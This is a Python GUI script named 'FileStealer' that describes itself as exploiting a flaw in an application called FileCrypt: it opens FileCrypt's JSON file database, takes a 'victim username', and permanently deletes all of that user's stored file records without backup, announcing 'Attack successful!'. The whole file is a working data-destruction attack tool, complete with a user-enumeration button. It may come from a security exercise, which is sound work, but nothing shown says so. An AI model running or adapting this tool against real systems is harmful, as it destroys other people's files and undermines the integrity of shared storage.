import ttkbootstrap as tb
from ttkbootstrap.constants import *
import tkinter as tk
from tkinter import messagebox, filedialog
import os
import json
import base64
import sys

# --- FILE MANAGEMENT ---
class FileManager:
    def __init__(self):
        self.db_file = None
        self._file_store = {}

    def load_file(self, db_file):
        self.db_file = db_file
        self._file_store = {}
        if not db_file or not os.path.exists(db_file):
            print(f"Warning: File database {db_file} does not exist.")
            return False
        try:
            with open(db_file, 'r') as f:
                b64_files = json.load(f)
                if not isinstance(b64_files, dict):
                    print(f"Error: {db_file} is not a valid JSON object.")
                    return False
                for file_id, data in b64_files.items():
                    if not isinstance(data, dict):
                        print(f"Warning: Invalid data for file_id '{file_id}'.")
                        continue
                    owner = data.get('owner', '') if data.get('owner') is not None else ''
                    self._file_store[file_id] = {
                        'owner': owner,
                        'encrypted_content': base64.b64decode(data.get('encrypted_content', '')),
                        'encrypted_aes_key': base64.b64decode(data.get('encrypted_aes_key', '')),
                        'integrity_hash': base64.b64decode(data.get('integrity_hash', ''))
                    }
                    if not owner:
                        print(f"Warning: File '{file_id}' has invalid owner: {data.get('owner')}")
            return True
        except (IOError, json.JSONDecodeError) as e:
            print(f"Error: Could not load file database: {e}")
            return False

    def save_files(self):
        if not self.db_file:
            raise ValueError("No database file selected.")
        b64_files = {}
        for file_id, data in self._file_store.items():
            b64_files[file_id] = {
                'owner': data['owner'],
                'encrypted_content': base64.b64encode(data['encrypted_content']).decode('utf-8'),
                'encrypted_aes_key': base64.b64encode(data['encrypted_aes_key']).decode('utf-8'),
                'integrity_hash': base64.b64encode(data['integrity_hash']).decode('utf-8')
            }
        try:
            with open(self.db_file, 'w') as f:
                json.dump(b64_files, f, indent=4)
        except IOError as e:
            raise IOError(f"Failed to save file database: {e}")

    def get_user_files(self, username):
        return [os.path.basename(file_id.split('_', 1)[1]) for file_id, file_data in self._file_store.items()
                if isinstance(file_data['owner'], str) and file_data['owner'].lower() == username.lower()]

    def get_all_prefixes(self):
        return {file_id.split('_', 1)[0] for file_id in self._file_store if '_' in file_id}

# --- GUI APPLICATION ---
class App(tb.Window):
    def __init__(self):
        super().__init__(themename="cosmo")
        self.title("FileStealer")
        self.geometry("600x400")
        self.file_manager = FileManager()
        self.attacker_user = "attacker"  # Fixed attacker username
        
        # Main frame
        self.main_frame = MainFrame(parent=self, controller=self)
        self.main_frame.pack(fill="both", expand=True)

        # Show help message on startup
        messagebox.showinfo(
            "About FileStealer",
            "This tool exploits a vulnerability in FileCrypt to permanently delete a specified user's files from its database (files.db.json), "
            "making them inaccessible in FileCrypt. Select the database, enter a victim's username, and click 'Steal Files' to remove their files. "
            "No backup is created, so files are permanently lost unless restored externally."
        )

class MainFrame(tb.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        # Header
        header = tb.Frame(self, padding=(20, 10))
        header.pack(fill="x")
        tb.Label(header, text="FileStealer: File Deletion Attack", font=("Segoe UI", 20, "bold"), bootstyle=PRIMARY).pack(anchor="w")

        # Content
        content = tb.Frame(self, padding=20)
        content.pack(fill="both", expand=True)
        content.columnconfigure(0, weight=1)
        content.rowconfigure(2, weight=1)

        # Database file selection
        db_frame = tb.Frame(content)
        db_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        tb.Label(db_frame, text="Database File:", font=("Segoe UI", 12)).pack(side="left")
        self.db_entry = tb.Entry(db_frame, font=("Segoe UI", 12))
        self.db_entry.pack(side="left", padx=10, fill="x", expand=True)
        tb.Button(db_frame, text="Browse", command=self.select_db_file, bootstyle=SECONDARY).pack(side="left")

        # Victim username input
        input_frame = tb.Frame(content)
        input_frame.grid(row=1, column=0, sticky="ew", pady=(0, 10))
        tb.Label(input_frame, text="Victim Username:", font=("Segoe UI", 12)).pack(side="left")
        self.victim_entry = tb.Entry(input_frame, font=("Segoe UI", 12))
        self.victim_entry.pack(side="left", padx=10, fill="x", expand=True)
        tb.Button(input_frame, text="Steal Files", command=self.delete_victim_files, bootstyle=DANGER).pack(side="left", padx=5)
        tb.Button(input_frame, text="List Users", command=self.list_victim_files, bootstyle=INFO).pack(side="left")

        # File list
        tb.Label(content, text="Attacker's Files", font=("Segoe UI", 12, "bold")).grid(row=2, column=0, sticky="w", pady=(0, 5))
        self.file_listbox = tk.Listbox(content, font=("Segoe UI", 11), borderwidth=1, relief="solid", selectbackground=self.controller.style.colors.primary, selectforeground="white")
        self.file_listbox.grid(row=3, column=0, sticky="nsew")

        # Suggest default path
        self.suggest_default_path()

    def suggest_default_path(self):
        # Check executable's directory for files.db.json
        if getattr(sys, 'frozen', False):  # Running as .exe
            exe_dir = os.path.dirname(sys.executable)
        else:  # Running as .py
            exe_dir = os.path.dirname(os.path.abspath(__file__))
        default_path = os.path.join(exe_dir, "files.db.json")
        if os.path.exists(default_path):
            self.db_entry.insert(0, default_path)
            if self.controller.file_manager.load_file(default_path):
                messagebox.showinfo("Success", f"Automatically loaded database: {default_path}")
                self.refresh_file_list()

    def select_db_file(self):
        db_file = filedialog.askopenfilename(
            title="Select Database File",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            initialdir=os.path.dirname(self.db_entry.get()) or os.getcwd()
        )
        if db_file:
            self.db_entry.delete(0, tk.END)
            self.db_entry.insert(0, db_file)
            if self.controller.file_manager.load_file(db_file):
                messagebox.showinfo("Success", f"Loaded database: {db_file}")
                self.refresh_file_list()
            else:
                messagebox.showerror("Error", f"Failed to load database: {db_file}")

    def refresh_file_list(self):
        self.file_listbox.delete(0, tk.END)
        files = self.controller.file_manager.get_user_files(self.controller.attacker_user)
        for f in files:
            self.file_listbox.insert(tk.END, f)

    def list_victim_files(self):
        if not self.controller.file_manager.db_file:
            messagebox.showwarning("Warning", "Please select a database file first.")
            return
        prefixes = self.controller.file_manager.get_all_prefixes()
        messagebox.showinfo("Available Users", f"Users with files: {prefixes if prefixes else 'None'}")

    def delete_victim_files(self):
        if not self.controller.file_manager.db_file:
            messagebox.showwarning("Warning", "Please select a database file first.")
            return
        victim_user = self.victim_entry.get().strip()
        if not victim_user:
            messagebox.showwarning("Warning", "Victim username cannot be empty.")
            return
        
        # Check write permissions
        if not os.access(self.controller.file_manager.db_file, os.W_OK):
            messagebox.showerror("Error", f"No write permission for {self.controller.file_manager.db_file}. Run as administrator or check file attributes.")
            return

        file_database = self.controller.file_manager._file_store
        files_to_delete = []
        for file_id in file_database:
            if file_id.startswith(victim_user + '_'):
                files_to_delete.append(file_id)
        
        if not files_to_delete:
            owners = {file_data['owner'] for file_data in file_database.values() if file_data['owner'] is not None}
            print(f"Debug: No files found for '{victim_user}'. Available owners: {owners}, file_ids: {list(file_database.keys())}")
            messagebox.showerror("Attack Failed", f"No files found for user '{victim_user}'. Check console for details.")
            return

        # Delete victim's files
        new_file_store = {file_id: file_data for file_id, file_data in file_database.items() if file_id not in files_to_delete}
        self.controller.file_manager._file_store = new_file_store
        
        try:
            self.controller.file_manager.save_files()
            messagebox.showinfo("Success", f"Attack successful! Deleted {len(files_to_delete)} file(s) for '{victim_user}' from the database.")
            self.victim_entry.delete(0, tk.END)
            self.refresh_file_list()
        except Exception as e:
            messagebox.showerror("Error", f"Error saving database: {e}")

if __name__ == "__main__":
    app = App()
    app.mainloop()
